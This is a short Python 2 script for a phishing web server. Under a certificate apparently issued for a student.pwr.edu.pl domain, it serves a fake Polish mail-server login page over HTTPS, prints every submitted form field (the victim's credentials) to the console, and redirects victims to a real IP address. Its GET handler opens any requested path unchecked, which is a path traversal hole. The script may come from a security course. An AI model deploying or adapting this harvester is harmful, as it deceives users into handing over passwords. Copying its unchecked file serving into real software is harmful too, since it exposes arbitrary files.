import BaseHTTPServer, SimpleHTTPServer
import ssl
import os.path
import os
import mimetypes
from cgi import parse_header, parse_multipart
from urlparse import parse_qs

CERTIFICATE='./signed_certificate.student.pwr.edu.pl.pem'
REDIRECT='http://156.17.193.186'
PORT=443


class Phishing(SimpleHTTPServer.SimpleHTTPRequestHandler):
   def parse_POST(self):
       ctype, pdict = parse_header(self.headers['content-type'])
       if ctype == 'multipart/form-data':
          postvars = parse_multipart(self.rfile, pdict)
       elif ctype == 'application/x-www-form-urlencoded':
          length = int(self.headers['content-length'])
          postvars = parse_qs(self.rfile.read(length), keep_blank_values=1)
       else:
          postvars = {}
       return postvars
       
   def do_POST(self):
          print(self.headers['content-type'])
          postvars = self.parse_POST()
          print(postvars)
          self.send_response(301)
          self.send_header('Location', REDIRECT)
          self.end_headers()
   
   def do_GET(self):
       print("request: " + self.path)
       if os.path.exists('./pass.txt'):
          self.send_response(301)
          self.send_header('Location', REDIRECT)
          self.end_headers()
       elif self.path == '/':
          fake = open('./serwer_pocztowy.html')
          mimetype, _ = mimetypes.guess_type('./serwer_pocztowy.html')
          self.send_response(200)
          self.send_header('Content-type', mimetype)
          self.end_headers()
          self.wfile.write(fake.read())
          fake.close()
       else:
          f = open('.' + self.path)
          mimetype, _ = mimetypes.guess_type(self.path)
          self.send_response(200)
          self.send_header('Content-type', mimetype)
          self.end_headers()
          self.wfile.write(f.read())
          f.close()
       

          

print("server works on port: ", PORT , " - redirect to ", REDIRECT)
httpd = BaseHTTPServer.HTTPServer(('localhost', PORT), Phishing)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile=CERTIFICATE, server_side=True)
httpd.serve_forever()

